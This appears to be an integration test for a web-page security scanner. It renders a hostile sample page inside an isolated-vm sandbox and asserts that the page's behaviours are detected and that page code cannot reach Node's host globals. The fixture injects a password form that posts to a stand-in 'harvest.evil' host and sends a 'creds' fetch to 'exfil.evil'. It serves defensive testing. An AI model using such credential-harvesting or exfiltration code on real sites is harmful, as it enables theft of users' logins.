// Integration test for the production dynamic-render path: page JavaScript run
// inside an isolated-vm sandbox via the compiled CLI executor.
//
// This runs under Node (not `bun test`): isolated-vm ships a native addon that
// Bun's runtime cannot dlopen, and the published bin runs on Node anyway. It
// imports from dist/ so it exercises the actual shipped artifact — run
// `npm run build` first (the `test:isolate` script does this for you).
import test from "node:test";
import assert from "node:assert/strict";
import { renderAndScan } from "../../dist/render.js";
import { behaviorFindings, discoveredUrlsFromBehavior } from "../../dist/dynamic.js";
import { renderInIsolate } from "../../dist/render-isolate/run.js";

const url = "https://t.evil/";

// One render drives every assertion: DOM materialization, behavior recording,
// network instrumentation, and — the point of the sandbox — that untrusted page
// JS cannot reach the Node host (process/require are absent inside the isolate).
const page = `<html><body><div id="app">…</div><script>
  document.getElementById('app').innerHTML =
    '<form action="https://harvest.evil/p" method="post"><input type="password" name="pw"></form>';
  document.title = 'proc=' + (typeof process) + ' req=' + (typeof require);
  fetch('https://exfil.evil/c', { method: 'POST', body: 'creds' });
  location.href = 'https://bounce.evil/next';
</script></body></html>`;

// Warm the isolate first: the very first render pays esbuild bundling + a cold
// V8 isolate's JIT cost for the linkedom bundle, which can approach the internal
// call timeout under CI load. Absorb that here (unasserted) so the measured
// render below reuses the warm isolate and stays fast/deterministic.
try {
  await renderInIsolate({ html: "<html><body>warm</body></html>", url: "https://warm.example/", externalScripts: [] });
} catch {
  // A cold-start stall here is fine — init() still succeeded, leaving the
  // isolate warm for the asserted render.
}

const { html, report } = await renderAndScan(page, { url, invoke: renderInIsolate });

test("isolate materializes an injected credential form in the rendered DOM", () => {
  assert.match(html, /<form[^>]*harvest\.evil/i);
  assert.match(html, /type="password"/i);
});

test("isolate records exfil network attempts and forced navigations", () => {
  assert.ok(report.network.some((n) => n.url === "https://exfil.evil/c"), "exfil fetch recorded");
  assert.ok(report.redirects.includes("https://bounce.evil/next"), "forced navigation recorded");
  assert.ok(discoveredUrlsFromBehavior(report, url).includes("https://bounce.evil/next"));
  assert.ok(behaviorFindings(report, url).length > 0, "behaviors surface findings");
});

test("untrusted page JS cannot reach the Node host (sandbox isolation)", () => {
  // The page wrote its view of the host globals into document.title.
  assert.match(html, /proc=undefined/, "page must not see Node `process`");
  assert.match(html, /req=undefined/, "page must not see CommonJS `require`");
});
